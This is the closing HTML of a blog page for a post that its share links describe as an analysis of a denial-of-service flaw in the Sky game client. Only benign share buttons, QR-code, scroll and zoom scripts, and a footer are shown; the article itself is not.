1-1h4a1 1 0 1 1 0 2h-4a1 1 0 0 1-1-1m-2 4a1 1 0 1 0-2 0v4a1 1 0 1 0 2 0z"/></g></svg> </button> <a href="http://service.weibo.com/share/share.php?url=https://blog.yuro.work/blog/sky-client-dos-rpc-flood&#38;title=光遇客户端 RPC 洪泛拒绝服务漏洞分析&#38;pic=" target="_blank" id="share-weibo" aria-label="Share to weibo" class="group rounded-full bg-muted p-1 text-muted-foreground transition-colors hover:text-primary sm:p-1.5 astro-sjxyoaq4"> <svg aria-hidden="true" class="size-5 astro-sjxyoaq4 astro-hn7k2gay" width="22" height="22" viewBox="0 0 24 24" fill="currentColor" style="--sl-icon-size: 1em;"><g fill="none"><path d="m12.593 23.258l-.011.002l-.071.035l-.02.004l-.014-.004l-.071-.035q-.016-.005-.024.005l-.004.01l-.017.428l.005.02l.01.013l.104.074l.015.004l.012-.004l.104-.074l.012-.016l.004-.017l-.017-.427q-.004-.016-.017-.018m.265-.113l-.013.002l-.185.093l-.01.01l-.003.011l.018.43l.005.012l.008.007l.201.093q.019.005.029-.008l.004-.014l-.034-.614q-.005-.018-.02-.022m-.715.002a.02.02 0 0 0-.027.006l-.006.014l-.034.614q.001.018.017.024l.015-.002l.201-.093l.01-.008l.004-.011l.017-.43l-.003-.012l-.01-.01z"/><path fill="currentColor" d="M13.12 5.815c.55.537.826 1.24.863 1.992c1.675-.502 3.045-.362 3.937.5c.848.82.937 1.967.617 2.964C19.9 11.961 21 13.058 21 14.715c0 1.93-1.256 3.526-2.962 4.586C16.318 20.371 14.004 21 11.5 21s-4.818-.63-6.538-1.699C3.256 18.241 2 16.646 2 14.715c0-1.762.842-3.589 2.05-5.156a14.6 14.6 0 0 1 4.723-3.954c1.635-.847 3.286-.828 4.347.21m-1.399 1.43c-.213-.21-.829-.485-2.028.136a12.6 12.6 0 0 0-4.06 3.4C4.576 12.154 4 13.558 4 14.715c0 .988.647 2.035 2.018 2.888C7.374 18.446 9.309 19 11.5 19c2.19 0 4.127-.554 5.482-1.397c1.371-.853 2.018-1.9 2.018-2.888c0-.711-.56-1.439-2.16-1.991a1 1 0 0 1-.473-1.546c.495-.66.355-1.248.163-1.433l-.048-.04l-.067-.042c-.337-.186-1.274-.368-3.335.661a1 1 0 0 1-1.347-1.33c.444-.92.225-1.517-.012-1.75ZM17 3c1.576 0 3.128.643 4.243 1.757A6.05 6.05 0 0 1 23 9a1 1 0 1 1-2 0c0-1.05-.429-2.086-1.172-2.828A4.04 4.04 0 0 0 17 5a1 1 0 1 1 0-2"/></g></svg> </a><a href="https://x.com/intent/tweet?text='光遇客户端 RPC 洪泛拒绝服务漏洞分析'&#38;url='https://blog.yuro.work/blog/sky-client-dos-rpc-flood'&#38;via='yuro'" target="_blank" id="share-x" aria-label="Share to x" class="group rounded-full bg-muted p-1 text-muted-foreground transition-colors hover:text-primary sm:p-1.5 astro-sjxyoaq4"> <svg aria-hidden="true" class="size-5 astro-sjxyoaq4 astro-hn7k2gay" width="22" height="22" viewBox="0 0 24 24" fill="currentColor" style="--sl-icon-size: 1em;"><g fill="none" fill-rule="evenodd"><path d="m12.594 23.258l-.012.002l-.071.035l-.02.004l-.014-.004l-.071-.036q-.016-.004-.024.006l-.004.01l-.017.428l.005.02l.01.013l.104.074l.015.004l.012-.004l.104-.074l.012-.016l.004-.017l-.017-.427q-.004-.016-.016-.018m.264-.113l-.014.002l-.184.093l-.01.01l-.003.011l.018.43l.005.012l.008.008l.201.092q.019.005.029-.008l.004-.014l-.034-.614q-.005-.019-.02-.022m-.715.002a.02.02 0 0 0-.027.006l-.006.014l-.034.614q.001.018.017.024l.015-.002l.201-.093l.01-.008l.003-.011l.018-.43l-.003-.012l-.01-.01z"/><path fill="currentColor" d="M19.753 4.659a1 1 0 0 0-1.506-1.317l-5.11 5.84L8.8 3.4A1 1 0 0 0 8 3H4a1 1 0 0 0-.8 1.6l6.437 8.582l-5.39 6.16a1 1 0 0 0 1.506 1.317l5.11-5.841L15.2 20.6a1 1 0 0 0 .8.4h4a1 1 0 0 0 .8-1.6l-6.437-8.582l5.39-6.16ZM16.5 19L6 5h1.5L18 19z"/></g></svg> </a> </div> <div id="qrcode-container" class="absolute z-10 -mt-2 box-content max-h-0 max-w-44 overflow-hidden rounded-xl border bg-muted p-4 opacity-0 transition-all duration-300 ease-in-out astro-sjxyoaq4 astro-nafosdfo"></div> <script src="https://cdn.jsdelivr.net/npm/qrcodejs/qrcode.min.js"></script> <script>(function(){const content = undefined;
+
+  const renderContent = content ?? window.location.href
+  // Load qrcode
+  function loadQRcode(qrcodeContainer) {
+    if (!qrcodeContainer) throw new Error('qrcode container not found')
+    if (qrcodeContainer.innerHTML !== '') return
+    new QRCode(qrcodeContainer, renderContent)
+  }
+  const qrcodeContainer = document.getElementById('qrcode-container')
+  if (!qrcodeContainer) throw new Error('qrcode container not found')
+  loadQRcode(qrcodeContainer)
+})();</script> </div> </div> <div class="mx-6 rounded-b-xl border border-t-0 px-3 pb-1.5 pt-1 sm:mx-8 sm:px-4 astro-sjxyoaq4"> <a href="/projects#sponsorship" class="flex items-center justify-between text-muted-foreground no-underline astro-sjxyoaq4" target="_blank"> <span class="astro-sjxyoaq4">Buy me a cup of coffee ☕.</span> <svg aria-hidden="true" class="box-content size-5 p-1 astro-sjxyoaq4 astro-hn7k2gay" width="22" height="22" viewBox="0 0 24 24" fill="currentColor" style="--sl-icon-size: 1em;"><g fill="none"><path d="m12.593 23.258l-.011.002l-.071.035l-.02.004l-.014-.004l-.071-.035q-.016-.005-.024.005l-.004.01l-.017.428l.005.02l.01.013l.104.074l.015.004l.012-.004l.104-.074l.012-.016l.004-.017l-.017-.427q-.004-.016-.017-.018m.265-.113l-.013.002l-.185.093l-.01.01l-.003.011l.018.43l.005.012l.008.007l.201.093q.019.005.029-.008l.004-.014l-.034-.614q-.005-.018-.02-.022m-.715.002a.02.02 0 0 0-.027.006l-.006.014l-.034.614q.001.018.017.024l.015-.002l.201-.093l.01-.008l.004-.011l.017-.43l-.003-.012l-.01-.01z"/><path fill="currentColor" d="M17 2a3 3 0 0 1 3 3v12a1 1 0 0 1 .351 1.936l-8 3a1 1 0 0 1-.702 0l-8-3A1 1 0 0 1 4 17V5a3 3 0 0 1 3-3zm0 2H7a1 1 0 0 0-.993.883L6 5v12.682l6 2.25l6-2.25V5a1 1 0 0 0-.883-.993zm-5 1a1 1 0 0 1 .993.883L13 6v1h2a1 1 0 0 1 .117 1.993L15 9h-5a.5.5 0 0 0-.09.992L10 10h4a2.5 2.5 0 0 1 .164 4.995L14 15h-1v1a1 1 0 0 1-1.993.117L11 16v-1H9a1 1 0 0 1-.117-1.993L9 13h5a.5.5 0 0 0 .09-.992L14 12h-4a2.5 2.5 0 0 1-.164-4.995L10 7h1V6a1 1 0 0 1 1-1"/></g></svg> </a> </div>  <script type="module" src="/_astro/Copyright.astro_astro_type_script_index_0_lang.B_VQDGfL.js"></script> <div class="flex max-sm:flex-col sm:justify-between gap-2 mt-3 sm:mt-6"> <span class="min-w-0">  </span> <span class="min-w-0"> <a href="/blog/tencent-game-security-competition-2016-writeup" class="group inline-flex items-center gap-x-2 rounded-xl px-4 py-2 text-right no-underline transition-colors duration-300 hover:bg-muted max-sm:float-end max-sm:max-w-[80%] sm:flex"> <p class="truncate font-medium transition-colors">腾讯游戏安全竞赛 2016 安卓方向初赛与决赛题目 Writeup</p> <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" class="shrink-0 stroke-muted-foreground transition-colors group-hover:stroke-primary"> <line x1="5" y1="12" x2="19" y2="12" class="translate-x-4 scale-x-0 transition-all duration-300 ease-in-out group-hover:translate-x-1 group-hover:scale-x-100"></line> <polyline points="12 5 19 12 12 19" class="translate-x-0 transition-all duration-300 ease-in-out group-hover:translate-x-1"></polyline> </svg> </a> </span> </div>   </div> <div class="min-w-48 basis-60 astro-scuu7fyy">  </div> </div> <div class="z-10 md:z-50 group fixed bottom-8 end-4 transition-all flex flex-col gap-y-4 sm:end-8 astro-jxfdehre" id="action-buttons"> <button aria-label="Toggle sidebar" class="size-10 flex items-center justify-center rounded-full border-2 border-transparent bg-muted text-muted-foreground duration-300 hover:border-border/75 md:hidden sm:size-12 astro-scuu7fyy" id="sidebar-btn"> <svg aria-hidden="true" class="astro-scuu7fyy astro-hn7k2gay" width="22" height="22" viewBox="0 0 24 24" fill="currentColor" style="--sl-icon-size: 1em;"><g fill="none"><path d="m12.593 23.258l-.011.002l-.071.035l-.02.004l-.014-.004l-.071-.035q-.016-.005-.024.005l-.004.01l-.017.428l.005.02l.01.013l.104.074l.015.004l.012-.004l.104-.074l.012-.016l.004-.017l-.017-.427q-.004-.016-.017-.018m.265-.113l-.013.002l-.185.093l-.01.01l-.003.011l.018.43l.005.012l.008.007l.201.093q.019.005.029-.008l.004-.014l-.034-.614q-.005-.018-.02-.022m-.715.002a.02.02 0 0 0-.027.006l-.006.014l-.034.614q.001.018.017.024l.015-.002l.201-.093l.01-.008l.004-.011l.017-.43l-.003-.012l-.01-.01z"/><path fill="currentColor" d="M4.5 17.5a1.5 1.5 0 1 1 0 3a1.5 1.5 0 0 1 0-3M20 18a1 1 0 1 1 0 2H9a1 1 0 1 1 0-2zM4.5 10.5a1.5 1.5 0 1 1 0 3a1.5 1.5 0 0 1 0-3M20 11a1 1 0 0 1 .117 1.993L20 13H9a1 1 0 0 1-.117-1.993L9 11zM4.5 3.5a1.5 1.5 0 1 1 0 3a1.5 1.5 0 0 1 0-3M20 4a1 1 0 0 1 .117 1.993L20 6H9a1 1 0 0 1-.117-1.993L9 4z"/></g></svg> </button> <scroll-button class="astro-jxfdehre"> <button aria-label="Back to Top" class="relative size-10 flex items-center justify-center rounded-full border-2 border-transparent bg-muted text-muted-foreground duration-300 hover:border-border/75 sm:size-12 opacity-0 astro-jxfdehre" id="to-top-btn"> <div class="top-text absolute bottom-0 end-0 start-0 top-0 flex items-center justify-center group-[.ended]:opacity-0 astro-jxfdehre"> <span class="text astro-jxfdehre">10</span> <span class="text-xs astro-jxfdehre">%</span> </div> <svg aria-hidden="true" class="top-icon group-[.ended]:opacity-100 astro-jxfdehre astro-hn7k2gay" width="22" height="22" viewBox="0 0 24 24" fill="currentColor" style="--sl-icon-size: 1em;"><g fill="none" fill-rule="evenodd"><path d="M24 0v24H0V0zM12.593 23.258l-.011.002l-.071.035l-.02.004l-.014-.004l-.071-.035q-.016-.005-.024.005l-.004.01l-.017.428l.005.02l.01.013l.104.074l.015.004l.012-.004l.104-.074l.012-.016l.004-.017l-.017-.427q-.004-.016-.017-.018m.265-.113l-.013.002l-.185.093l-.01.01l-.003.011l.018.43l.005.012l.008.007l.201.093q.019.005.029-.008l.004-.014l-.034-.614q-.005-.019-.02-.022m-.715.002a.02.02 0 0 0-.027.006l-.006.014l-.034.614q.001.018.017.024l.015-.002l.201-.093l.01-.008l.004-.011l.017-.43l-.003-.012l-.01-.01z"/><path fill="currentColor" d="M11.293 8.293a1 1 0 0 1 1.414 0l5.657 5.657a1 1 0 0 1-1.414 1.414L12 10.414l-4.95 4.95a1 1 0 0 1-1.414-1.414z"/></g></svg> </button> </scroll-button> </div> <script>(function(){const headerName = "content-header";
+const contentName = "content";
+const needPercent = true;
+
+  class ScrollBtn extends HTMLElement {
+    actionBtns
+    scrollBtn
+    scrollPercentEl
+    targetHeader
+    articleEl
+    scrollHeight = 0
+    articleTop = 0
+    clientHeight = 0
+    ticking = false
+    needPercent = true
+
+    calculateScrollPercent() {
+      const scrollTop = Math.max(0, window.scrollY || document.documentElement.scrollTop)
+      // Before article
+      if (scrollTop < this.articleTop) return 0
+      const maxScrollable = this.scrollHeight - this.clientHeight
+      // After article
+      if (maxScrollable <= 0) return 100
+      const progress = Math.min(scrollTop - this.articleTop, maxScrollable)
+      return Math.round((progress / maxScrollable) * 100)
+    }
+
+    updateScrollPercent() {
+      const percent = this.calculateScrollPercent()
+      this.scrollPercentEl.textContent = percent.toString()
+      this.actionBtns.classList.toggle('ended', percent >= 100)
+      this.ticking = false
+    }
+
+    connectedCallback() {
+      this.needPercent = needPercent
+      this.actionBtns = document.getElementById('action-buttons')
+      this.scrollBtn = this.querySelector('button#to-top-btn')
+      this.scrollPercentEl = this.scrollBtn.querySelector('.top-text .text')
+      this.targetHeader = document.getElementById(headerName)
+      this.articleEl = document.getElementById(contentName)
+
+      if (!this.articleEl) {
+        console.error(`Element with ID ${contentName} not found.`)
+        needPercent = false
+      }
+      // Scroll to top action
+      this.scrollBtn.addEventListener('click', this)
+      // Observe header visibility
+      if (this.targetHeader) {
+        const observer = new IntersectionObserver((entries) => {
+          entries.forEach((entry) => {
+            this.actionBtns.classList.toggle('show', !entry.isIntersecting)
+          })
+        })
+        observer.observe(this.targetHeader)
+      } else {
+        console.error(`Element with ID ${headerName} not found.`)
+      }
+      // Scroll percent update
+      if (this.needPercent) {
+        this.scrollHeight = this.articleEl.scrollHeight
+        this.articleTop = this.articleEl.offsetTop
+        this.clientHeight = document.documentElement.clientHeight
+
+        document.addEventListener('scroll', () => {
+          if (!this.ticking) {
+            requestAnimationFrame(() => this.updateScrollPercent())
+            this.ticking = true
+          }
+        })
+      } else {
+        this.actionBtns.classList.add('ended')
+      }
+    }
+
+    handleEvent(event) {
+      if (event.type === 'click') {
+        window.scrollTo({ top: 0, behavior: 'smooth' })
+      }
+    }
+  }
+  customElements.define('scroll-button', ScrollBtn)
+})();</script>  </div> <footer class="mx-auto mb-5 mt-16 w-full astro-dojmed5u"> <div class="border-t pt-5 astro-dojmed5u"> <div class="flex items-center gap-y-3 max-sm:flex-col sm:justify-between sm:gap-y-0 astro-dojmed5u"> <div class="flex items-center gap-x-4 gap-y-2 text-muted-foreground max-sm:flex-col astro-dojmed5u"> <div class="astro-dojmed5u">  <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" target="_blank" class="text-sm astro-dojmed5u"> cat /flag </a>  </div>  <div class="astro-dojmed5u"> © 2026 yuro 
+&
+<span class="astro-dojmed5u">  </span>  </div> <span class="astro-dojmed5u"> <a href="https://github.com/withastro/astro" target="_blank" class="astro-dojmed5u">
+Astro
+</a>
+&
+<a href="https://github.com/cworld1/astro-theme-pure" target="_blank" class="astro-dojmed5u">
+Pure
+</a>
+theme powered
+</span> </div>  <div class="flex items-center gap-x-4 astro-dojmed5u"> <a href="https://github.com/YuroGod" rel="me" class="sl-flex astro-dojmed5u"> <span class="sr-only astro-dojmed5u">GitHub</span> <svg aria-hidden="true" class="astro-dojmed5u astro-hn7k2gay" width="22" height="22" viewBox="0 0 24 24" fill="currentColor" style="--sl-icon-size: 1em;"><g fill="none"><path d="m12.593 23.258l-.011.002l-.071.035l-.02.004l-.014-.004l-.071-.035q-.016-.005-.024.005l-.004.01l-.017.428l.005.02l.01.013l.104.074l.015.004l.012-.004l.104-.074l.012-.016l.004-.017l-.017-.427q-.004-.016-.017-.018m.265-.113l-.013.002l-.185.093l-.01.01l-.003.011l.018.43l.005.012l.008.007l.201.093q.019.005.029-.008l.004-.014l-.034-.614q-.005-.018-.02-.022m-.715.002a.02.02 0 0 0-.027.006l-.006.014l-.034.614q.001.018.017.024l.015-.002l.201-.093l.01-.008l.004-.011l.017-.43l-.003-.012l-.01-.01z"/><path fill="currentColor" d="M6.315 6.176c-.25-.638-.24-1.367-.129-2.034a6.8 6.8 0 0 1 2.12 1.07c.28.214.647.283.989.18A9.3 9.3 0 0 1 12 5c.961 0 1.874.14 2.703.391c.342.104.709.034.988-.18a6.8 6.8 0 0 1 2.119-1.07c.111.667.12 1.396-.128 2.033c-.15.384-.075.826.208 1.14C18.614 8.117 19 9.04 19 10c0 2.114-1.97 4.187-5.134 4.818c-.792.158-1.101 1.155-.495 1.726c.389.366.629.882.629 1.456v3a1 1 0 0 0 2 0v-3c0-.57-.12-1.112-.334-1.603C18.683 15.35 21 12.993 21 10c0-1.347-.484-2.585-1.287-3.622c.21-.82.191-1.646.111-2.28c-.071-.568-.17-1.312-.57-1.756c-.595-.659-1.58-.271-2.28-.032a9 9 0 0 0-2.125 1.045A11.4 11.4 0 0 0 12 3c-.994 0-1.953.125-2.851.356a9 9 0 0 0-2.125-1.045c-.7-.24-1.686-.628-2.281.031c-.408.452-.493 1.137-.566 1.719l-.005.038c-.08.635-.098 1.462.112 2.283C3.484 7.418 3 8.654 3 10c0 2.992 2.317 5.35 5.334 6.397A4 4 0 0 0 8 17.98l-.168.034c-.717.099-1.176.01-1.488-.122c-.76-.322-1.152-1.133-1.63-1.753c-.298-.385-.732-.866-1.398-1.088a1 1 0 0 0-.632 1.898c.558.186.944 1.142 1.298 1.566c.373.448.869.916 1.58 1.218c.682.29 1.483.393 2.438.276V21a1 1 0 0 0 2 0v-3c0-.574.24-1.09.629-1.456c.607-.572.297-1.568-.495-1.726C6.969 14.187 5 12.114 5 10c0-.958.385-1.881 1.108-2.684c.283-.314.357-.756.207-1.14"/></g></svg> </a><a href="/rss.xml" rel="me" class="sl-flex astro-dojmed5u"> <span class="sr-only astro-dojmed5u">RSS</span> <svg aria-hidden="true" class="astro-dojmed5u astro-hn7k2gay" width="22" height="22" viewBox="0 0 24 24" fill="currentColor" style="--sl-icon-size: 1em;"><g fill="none"><path d="m12.594 23.258l-.012.002l-.071.035l-.02.004l-.014-.004l-.071-.036q-.016-.004-.024.006l-.004.01l-.017.428l.005.02l.01.013l.104.074l.015.004l.012-.004l.104-.074l.012-.016l.004-.017l-.017-.427q-.004-.016-.016-.018m.264-.113l-.014.002l-.184.093l-.01.01l-.003.011l.018.43l.005.012l.008.008l.201.092q.019.005.029-.008l.004-.014l-.034-.614q-.005-.019-.02-.022m-.715.002a.02.02 0 0 0-.027.006l-.006.014l-.034.614q.001.018.017.024l.015-.002l.201-.093l.01-.008l.003-.011l.018-.43l-.003-.012l-.01-.01z"/><path fill="currentColor" d="M5.5 17a1.5 1.5 0 1 1 0 3a1.5 1.5 0 0 1 0-3m0-14C14.06 3 21 9.94 21 18.5q0 .268-.009.534a1 1 0 0 1-1.999-.068Q19 18.734 19 18.5C19 11.044 12.956 5 5.5 5q-.234 0-.466.008a1 1 0 0 1-.068-1.999Q5.231 3 5.5 3m0 7a8.5 8.5 0 0 1 8.482 9.066a1 1 0 0 1-1.996-.132a6.5 6.5 0 0 0-6.92-6.92a1 1 0 1 1-.132-1.995q.28-.02.566-.019"/></g></svg> </a> </div> </div> </div> </footer> </div>  </body> </html> <script type="module">const d=document.getElementById("sidebar-btn"),e=document.getElementById("sidebar"),s=document.getElementById("sidebar-shade");s&&s.addEventListener("click",()=>{t()});function t(){e&&e.classList.contains("show")?(e.classList.remove("show"),s.style.display="none"):e&&(e.classList.add("show"),s.style.display="block")}d?.addEventListener("click",()=>{t()});</script> <script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/pure/medium-zoom.min.umd.js"></script> <script>(function(){const selector = ".prose .zoomable";
+const background = "hsl(var(--background) / 0.8)";
+
+  mediumZoom(selector, { background })
+})();</script> 
